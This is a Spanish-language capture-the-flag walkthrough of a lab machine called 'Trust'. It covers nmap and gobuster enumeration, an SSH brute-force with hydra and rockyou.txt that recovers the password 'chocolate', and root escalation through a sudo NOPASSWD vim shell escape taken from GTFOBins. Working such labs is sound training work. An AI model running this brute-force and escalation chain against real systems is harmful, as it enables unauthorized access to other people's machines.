# Trust
## 1. Reconocimiento de Puertos con Nmap

Iniciamos la auditoría con un escaneo de puertos para identificar la superficie de ataque y las versiones de los servicios.

```bash
nmap -sC -sV <IP_DEL_OBJETIVO>
```

| **Puerto** | **Estado** | **Servicio** | **Versión**                 |
| ---------- | ---------- | ------------ | --------------------------- |
| **22/tcp** | Open       | ssh          | OpenSSH (Versión detectada) |
| **80/tcp** | Open       | http         | Apache httpd                |
Detectamos un servidor web Apache en el puerto 80, lo que sugiere una posible vía de entrada a través de la aplicación web.

## 2. Enumeración Web y Descubrimiento de Directorios

Al acceder a `http://<IP_DEL_OBJETIVO>`, nos encontramos con una página estática por defecto. Procedemos a realizar una enumeración de directorios y archivos para descubrir contenido oculto.

### 2.1. Fuzzing de Directorios y Archivos
Utilizamos `gobuster` buscando específicamente extensiones comunes como `.php` y `.html`.

```Bash
gobuster dir -u http://<IP_DEL_OBJETIVO>/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```

**Salida Relevante:**

```
/index.html           (Status: 200)
/secret.php           (Status: 200)
/server-status        (Status: 403)
```

### 2.2. Análisis de Contenido

Al navegar al recurso descubierto `http://<IP_DEL_OBJETIVO>/secret.php`, encontramos el siguiente mensaje:

> "Hola Mario, Esta web no se puede hackear."

Este mensaje nos proporciona un nombre de usuario: **Mario**.

## 3. Acceso Inicial: Fuerza Bruta SSH

Con el usuario `mario` identificado y el puerto 22 abierto, realizamos un ataque de fuerza bruta, dado que no encontramos credenciales en la web.

### 3.1. Ataque de Fuerza Bruta con Hydra

Ejecutamos `hydra` utilizando el diccionario `rockyou.txt`.

```Bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://<IP_DEL_OBJETIVO> -t 4
```

**Resultado:**

```
[22][ssh] host: <IP_DEL_OBJETIVO>   login: mario   password: chocolate
```

Hemos obtenido la contraseña: **chocolate**.

### 3.2. Conexión SSH

Accedemos al servidor con las credenciales comprometidas.

```Bash
ssh mario@<IP_DEL_OBJETIVO>
# Password: chocolate
```

## 4. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `mario`, el objetivo es escalar privilegios a `root`.

### 4.1. Verificación de Permisos Sudo

Una vez autenticados, verificamos los privilegios del usuario `mario` para ejecutar comandos como superusuario.

**Salida:**

```
User mario may run the following commands on trust:
    (root) NOPASSWD: /usr/bin/vim
```

El usuario puede ejecutar el editor de texto `vim` con permisos de `root` y sin necesidad de introducir contraseña (`NOPASSWD`).

### 4.2. Explotación de Vim (GTFOBins)

`vim` es un editor de texto, permite la ejecución de comandos del sistema operativo. Si se ejecuta con `sudo`, podemos invocar una shell que heredará los privilegios de root.
Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo), y nos proporciona el siguiente comando para obtener un shell de `root` a través de `vim`:

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

- `-c`: Pasa un comando a vim al iniciarse.
- `:!/bin/sh`: Dentro de vim, `!` ejecuta un comando externo, en este caso, una shell `sh`.

Al ejecutarlo, obtenemos una shell con privilegios elevados.

```Bash
whoami
# root
```
